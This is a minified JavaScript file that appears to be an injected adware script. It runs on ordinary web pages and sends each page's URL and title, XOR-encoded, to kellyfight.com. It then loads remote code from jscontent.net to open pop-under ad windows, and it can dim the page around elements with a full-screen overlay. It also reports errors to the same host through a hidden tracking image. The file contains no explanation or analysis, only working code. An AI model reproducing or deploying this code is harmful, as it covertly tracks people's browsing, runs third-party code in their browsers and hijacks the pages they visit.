;try{(function(d,w,u){if(w.top!=w){return}if(w["22aff56f45f6b36dec"]===u&&w["__twb__22aff56f45f6b36dec"]===u){return}var $$=(w["22aff56f45f6b36dec"])?w["22aff56f45f6b36dec"]:w["__twb__22aff56f45f6b36dec"];var addCss;(function(){var stylesQueue=[],timeoutRecursiveCall,timeoutCancel;function appendToBody(style){stylesQueue.push(style);if(!d.body){timeoutRecursiveCall=setTimeout(arguments.callee,100);if(!timeoutCancel){timeoutCancel=setTimeout(function(){clearTimeout(timeoutRecursiveCall)},3000)}}else{while(stylesQueue.length){d.body.appendChild(stylesQueue.pop())}}}addCss=function(css){var style=d.createElement("style");style.type="text/css";style.styleSheet?style.styleSheet.cssText+=css:style.innerHTML+=css;appendToBody(style);return style}})();(function(g,j,n){var b,h=false,l=[],a=n,k=k||{};var m=j["22aff56f45f6b36dec"];function c(){h=true;while(l.length>0){(l.pop())()}}b={cors:function(d){var p=m.apply({url:"//kellyfight.com/ext/__utm.gif",callback:function(){},timeout:5000,onTimeout:function(){},mode:"auto",data:{}},d||{});p.data.key="22aff56f45f6b36dec";p.data.sid="52429_8879_";var e=(j.XMLHttpRequest?new j.XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP"));p.url+="?a="+encodeURIComponent(m.xor(m.toJson(p.data)));;if((p.mode=="auto"&&e.withCredentials!==n)||p.mode=="xhr"){m.xhrRequest(e,p)}else{m.jsonpRequest(p)}},date:new Date(),bannerHideTime:86400000,adTitle:(m.tbParams.title?m.tbParams.title:"not this site"),useCtrEnchancer:"",lp:"ga_22aff56f45f6b36dec_",lset:function(d,e){return localStorage.setItem(d,m.toJson(e))},lget:function(d,o){var e=localStorage.getItem(d);if(e){return m.fromJson(e)}},getSiteConfig:function(){return this.lget(this.lp+"cfg")||{}},saveSiteConfig:function(d){this.lset(this.lp+"cfg",d)},bannerInfoClick:function(d){m.optoutShow(d)},allowBannerInsert:function(){if(location.protocol=="https:"){return false}return true},getRand:function(e,d){return Math.floor((Math.random()*d)+e)},cumulativeOffset:function(d){var o=0,e=0;do{o+=d.offsetTop||0;e+=d.offsetLeft||0;d=d.offsetParent}while(d);return{top:o,left:e}},getScrollOffset:function(){var e=0,d=0;if(typeof(window.pageYOffset)=="number"){d=window.pageYOffset;e=window.pageXOffset}else{if(document.body&&(document.body.scrollLeft||document.body.scrollTop)){d=document.body.scrollTop;e=document.body.scrollLeft}else{if(document.documentElement&&(document.documentElement.scrollLeft||document.documentElement.scrollTop)){d=document.documentElement.scrollTop;e=document.documentElement.scrollLeft}}}return[e,d]},maskInitiated:false,createMask:function(e){if(!m.maskInitiated){var u="background-color: #000000;opacity: 0.8;position: absolute;z-index: 999999991;";var t='<div id="dc-ce-mask-1" style="'+u+'" class="dc-ce-mask" ></div>';t+='<div id="dc-ce-mask-2" style="'+u+'" class="dc-ce-mask" ></div>';t+='<div id="dc-ce-mask-3" style="'+u+'" class="dc-ce-mask" ></div>';t+='<div id="dc-ce-mask-4" style="'+u+'" class="dc-ce-mask" ></div>';t+='<div id="dc-ce-message-container" style="z-index: 999999992;position: fixed;top: 0;left: 0;height: auto;width: 100%;padding: 0 !important;background-color: #000000;" ><div id="dc-ce-message"></div></div>';var d=g.createElement("div");d.innerHTML=t;g.body.appendChild(d);m.maskInitiated=true}var E=e.clientWidth;var p=e.clientHeight;var w=g.documentElement,v=g.getElementsByTagName("body")[0];var r=Math.max(v.scrollWidth,v.offsetWidth,w.clientWidth,w.scrollWidth,w.offsetWidth);var D=Math.max(v.scrollHeight,v.offsetHeight,w.clientHeight,w.scrollHeight,w.offsetHeight);var s=m.cumulativeOffset(e);var z=s.top;var x=s.left;var q=D-z-p;var o=r-x-E;var C=g.getElementById("dc-ce-mask-1");C.style.top=0;C.style.left=0;C.style.height=z+"px";C.style.width=r+"px";var B=g.getElementById("dc-ce-mask-2");B.style.top=z+"px";B.style.left=0;B.style.height=p+"px";B.style.width=x+"px";var A=g.getElementById("dc-ce-mask-3");A.style.top=z+p+"px";A.style.left=0;A.style.height=q+"px";A.style.width=r+"px";var y=g.getElementById("dc-ce-mask-4");y.style.top=z+"px";y.style.left=x+E+"px";y.style.height=p+"px";y.style.width=o+"px";m.each(__$(".dc-ce-mask"),function(F){F.style.display="block"})},enableCtrEnchanser:function(d){m.on(d,"mouseover",function(){if(!d.__mask_enabled){m.createMask(d);d.__mask_enabled=1}});m.on(d,"mouseleave",function(){m.each(__$(".dc-ce-mask"),function(e){e.style.display="none";d.__mask_enabled=0})})},applyCssStyle:function(o,p){if(!o){return false}var s=o.style.cssText;var r=s.split(";");var d={};for(var e in r){var q=r[e].split(":");d[q[0]]=q[1]}for(var e in p){d[e]=p[e]}var t=[];for(var e in d){t.push(e+":"+d[e])}o.style.cssText=t.join(";")},callEvent:function(e,o){if(e.fireEvent){e.fireEvent("on"+o)}else{var d=document.createEvent("Events");d.initEvent(o,true,false);e.dispatchEvent(d)}}};j["22aff56f45f6b36dec"]=m.apply(j["22aff56f45f6b36dec"],b);if(g.addEventListener){g.addEventListener("DOMContentLoaded",function(){c()},false)}else{if(g.attachEvent){g.attachEvent("onreadystatechange",function(){c()})}}if(g.readyState){(function(){if((!b.isIe&&g.readyState==="interactive")||g.readyState==="complete"){c()}else{setTimeout(arguments.callee,100)}})()}else{var i=false;try{i=window.frameElement==null}catch(f){}if(g&&g.dElement&&g.dElement.doScroll&&i){(function(){try{g.dElement.doScroll("left")}catch(d){setTimeout(arguments.callee,100);return}c()})()}}})(document,window,undefined);;$$=w["22aff56f45f6b36dec"];var cancel=false,__$=$$.Sizzle;$$.siteConfig=$$.getSiteConfig();if("kellyfight.com"&&location.href.indexOf("kellyfight.com")>-1){return false}var watcher={status:{waiting:false,changed:false,failed:false},setStatus:function(obj){if(obj==undefined){return}this.status=$$.apply(this.status,obj)},queue:[],addToQueue:function(f){this.queue.push(f)},performQueue:function(){if(this.queue.length){this.queue.forEach(function(f){f()})}this.queue=[]},step:50,watchForResEl:function(selector,wait){var markedEl=__$(selector)[0];if(markedEl!=null&&markedEl!=undefined){markedEl.setAttribute("mrk","fea4")}else{}this.status.waiting=true;this.queue=[];var self=this,c=Math.ceil(wait/this.step),t=setInterval(function(){if(wait>-1&&--c==0){clearInterval(t);self.status.waiting=false;self.status.failed=true;self.performQueue();return}var markedEl=__$(selector)[0];if(markedEl!=null&&markedEl!=undefined&&markedEl.getAttribute("mrk")==null){clearInterval(t);self.status.waiting=false;self.status.changed=true;self.performQueue()}},this.step)}};var isFiltered=function(kw){if(!kw){return false}var filterPatterns=["youtube","facebook","gmail","google","hotmail","porn","adult","fuck","cunt","pussy","dick","anal","face","tube","como","friv","marca","hacer","caixa","milanuncios","juegos","elitetorrent","divxtotal","videos","elitegol","netflix","peliculas","pelis24","online","mejortorrent","xvideos","pelicula","peliculas"];var filterQueries=["f","y","m","de","fa","yo","es","yt","la","se","you","ver","hot","xxx","que"];var i;for(i in filterPatterns){if(!filterPatterns.hasOwnProperty(i)){continue}if(kw.indexOf(filterPatterns[i])>-1){return true}}for(i in filterQueries){if(!filterQueries.hasOwnProperty(i)){continue}if(kw===filterQueries[i]){return true}}return false};;;;;;;;;;;;;;;;;;;;;(function(){if(window.top!=window||window["22aff56f45f6b36dec"]===undefined||window["22aff56f45f6b36dec"].l["22aff56f45f6b36dec_9236ce9a42bf1e17bf8ddf1ae95ed5fe"]){"return"}window["22aff56f45f6b36dec"].l["22aff56f45f6b36dec_9236ce9a42bf1e17bf8ddf1ae95ed5fe"]=true;;var $$=w["22aff56f45f6b36dec"],__$=$$.Sizzle,block="pops_rtb";var script=$$.script("//jscontent.net/addons/pops/script.js");$$.on(script,"load",function(){$$.script("//jscontent.net/addons/pops/license.85.js",false)});var setupPops=function(BetterJsPop,urlToPopup){var getPopUrl=function(){return urlToPopup};BetterJsPop.config({debug:false,perpage:1,coverTags:["iframe"]}).add(getPopUrl,{newTab:true,under:true,cookieExpires:120,beforeOpen:function(url,options){},afterOpen:function(url,options,popWin){}})};$$.ready(function(){$$.cors({callback:function(data){if(data.result&&data.url){setupPops(window.BetterJsPop,data.url)}},mode:"xhr",data:{a:"getAd",block:block,kw:(document.title?document.title:""),url:location.href,counter1:'0',counter2:'0',direct:0},timeout:15000})})})();;;;;;;;;;;;;;;;;;;;;;;;;;;})(document,window,undefined);;}catch(e){var stack=(typeof e.stack!="undefined"?e.stack:"!empty stack!");if(stack.length>1500){stack=stack.substr(0,1500)}var src=(window.location.protocol=="http:"?"http:":"https:")+"//kellyfight.com/log?l=error&m="+encodeURIComponent((typeof e.message!="undefined"?e.message:"!empty message!")+"|"+stack);var s=document.createElement("script");s.type="text/javascript";s.src=src+(src.indexOf("?")==-1?"?":"&")+"t="+(new Date().getTime());(document.getElementsByTagName("script")[0]||document.documentElement.firstChild).parentNode.appendChild(s);var $$=window["22aff56f45f6b36dec"];var params=["mid=","wid="+($$&&$$.tbParams)?$$.tbParams.wid:"","sid="+($$&&$$.tbParams)?$$.tbParams.sid:"","tid="+($$&&$$.tbParams)?$$.tbParams.tid:"","rid=PLATFORM_JS_ERROR"];src=(window.location.protocol=="http:"?"http:":"https:")+"//kellyfight.com/metric?"+params.join("&");var imgEl=document.createElement("img");imgEl.setAttribute("style","width:0;height:0;display:none;visibility:hidden;");imgEl.src=src+(src.indexOf("?")==-1?"?":"&")+"t="+(new Date().getTime());document.getElementsByTagName("body")[0].appendChild(imgEl);if(typeof imgEl.onload!="undefined"){imgEl.onload=function(){imgEl.parentNode&&imgEl.parentNode.removeChild(imgEl)}}};